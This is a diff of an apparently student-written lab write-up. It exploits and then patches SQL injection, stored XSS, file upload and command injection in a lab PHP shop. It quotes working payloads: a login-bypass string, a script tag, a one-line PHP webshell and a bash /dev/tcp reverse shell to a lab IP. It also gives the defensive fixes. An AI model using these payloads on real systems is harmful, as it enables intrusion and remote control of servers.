@@ -15,7 +15,7 @@ I will demonstrate exactly where the code was vulnerable, how the exploit levera
 ### 1. SQL Injection (A03:2021-Injection)
 
 **The Exploit:**
-I targeted the authentication mechanism by sending a malicious POST request to the `/login.php` endpoint. ![](/assets/images/lab/masar-final-project/07_sqli_login_page_baseline.png). Through Burp Suite and the browser, I injected the payload `admin' -- -` into the username field. ![](/assets/images/lab/masar-final-project/11_sqli_auth_bypass_payload_input.png). This effectively bypassed the authentication form without a valid password, logging me in as the admin and returning an HTTP 302 redirect to the index page. ![](/assets/images/lab/masar-final-project/13_sqli_auth_bypass_burp_302_redirect.png).
+I targeted the authentication mechanism by sending a malicious POST request to the `/login.php` endpoint. ![](/assets/images/lab/masar-final-project/07_sqli_login_page_baseline.png) Through Burp Suite and the browser, I injected the payload `admin' -- -` into the username field. ![](/assets/images/lab/masar-final-project/11_sqli_auth_bypass_payload_input.png) This effectively bypassed the authentication form without a valid password, logging me in as the admin and returning an HTTP 302 redirect to the index page. ![](/assets/images/lab/masar-final-project/13_sqli_auth_bypass_burp_302_redirect.png)
 
 **The Root Cause:**
 
@@ -59,7 +59,7 @@ Note: By separating the SQL syntax from the user-provided data, the database tre
 ### 2. Stored Cross-Site Scripting (A03:2021-Injection)
 
 **The Exploit:**
-I submitted a malicious review on the product page (`/product.php?id=1`). ![](/assets/images/lab/masar-final-project/15_xss_product_review_form.png). I inserted the payload `<script>alert(123)</script>` into the review text field. ![](/assets/images/lab/masar-final-project/16_xss_alert_payload_input.png). When the page was reloaded, the application rendered the script, popping an alert box in the browser and proving client-side code execution. ![](/assets/images/lab/masar-final-project/17_xss_alert_popup_execution.png).
+I submitted a malicious review on the product page (`/product.php?id=1`). ![](/assets/images/lab/masar-final-project/15_xss_product_review_form.png) I inserted the payload `<script>alert(123)</script>` into the review text field. ![](/assets/images/lab/masar-final-project/16_xss_alert_payload_input.png) When the page was reloaded, the application rendered the script, popping an alert box in the browser and proving client-side code execution. ![](/assets/images/lab/masar-final-project/17_xss_alert_popup_execution.png)
 
 **The Root Cause:**
 
@@ -98,7 +98,7 @@ Note: Converting these characters guarantees that the browser renders the payloa
 ### 3. Unrestricted File Upload (A04:2021-Insecure Design)
 
 **The Exploit:**
-I accessed the profile update functionality at `POST /account.php`. Instead of an image, I uploaded a PHP webshell named `shell.php` containing `<?php system($_GET["cmd"]); ?>`. ![](/assets/images/lab/masar-final-project/28_file_upload_shell_php_selected.png). ![](/assets/images/lab/masar-final-project/29_file_upload_burp_multipart_post.png). After uploading, I accessed the file at `/uploads/shell.php?cmd=id`, which executed the `id` command and returned `uid=33(www-data)` in Burp Repeater. ![](/assets/images/lab/masar-final-project/33_webshell_repeater_cmd_id.png).
+I accessed the profile update functionality at `POST /account.php`. Instead of an image, I uploaded a PHP webshell named `shell.php` containing `<?php system($_GET["cmd"]); ?>`. ![](/assets/images/lab/masar-final-project/28_file_upload_shell_php_selected.png) ![](/assets/images/lab/masar-final-project/29_file_upload_burp_multipart_post.png) After uploading, I accessed the file at `/uploads/shell.php?cmd=id`, which executed the `id` command and returned `uid=33(www-data)` in Burp Repeater. ![](/assets/images/lab/masar-final-project/33_webshell_repeater_cmd_id.png)
 
 **The Root Cause:**
 
@@ -144,7 +144,7 @@ Note: By discarding the original filename and strictly verifying the file signat
 ### 4. OS Command Injection (A03:2021-Injection)
 
 **The Exploit:**
-I used the order tracking feature at `POST /diagnostics.php`. By injecting a shell separator into the `order_id` parameter, I sent the payload `127.0.0.1 ; id`. ![](/assets/images/lab/masar-final-project/38_cmdi_diagnostics_burp_id_injection.png). I escalated this by sending a full bash reverse shell payload: `bash -c 'bash -i 5<> /dev/tcp/192.168.230.130/4444 0<&5 1>&5 2>&5'`. ![](/assets/images/lab/masar-final-project/39_revshell_browser_diagnostics_payload.png). This successfully forced the server to connect back to my Netcat listener, granting me interactive command execution. ![](/assets/images/lab/masar-final-project/41_revshell_nc_session_established.png).
+I used the order tracking feature at `POST /diagnostics.php`. By injecting a shell separator into the `order_id` parameter, I sent the payload `127.0.0.1 ; id`. ![](/assets/images/lab/masar-final-project/38_cmdi_diagnostics_burp_id_injection.png) I escalated this by sending a full bash reverse shell payload: `bash -c 'bash -i 5<> /dev/tcp/192.168.230.130/4444 0<&5 1>&5 2>&5'`. ![](/assets/images/lab/masar-final-project/39_revshell_browser_diagnostics_payload.png) This successfully forced the server to connect back to my Netcat listener, granting me interactive command execution. ![](/assets/images/lab/masar-final-project/41_revshell_nc_session_established.png)
 
 **The Root Cause:**
 
@@ -185,3 +185,5 @@ echo "" . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . "";
 I removed the `shell_exec()` string concatenation entirely. First, in line `if (preg_match('/^[a-zA-Z0-9.]+$/', $order_id))` it enforces strict alphanumeric input validation. Furthermore, as per the line code `$process = proc_open(['/usr/bin/ping', '-c', '1', $order_id], $descriptorspec, $pipes);`, the command and its arguments are explicitly passed as an array.
 
 Note: `proc_open` handles the arguments directly and bypasses the shell interpreter completely, meaning shell metacharacters are treated merely as literal strings, neutralizing any command injection attempt.
+
+Thank you for reading!
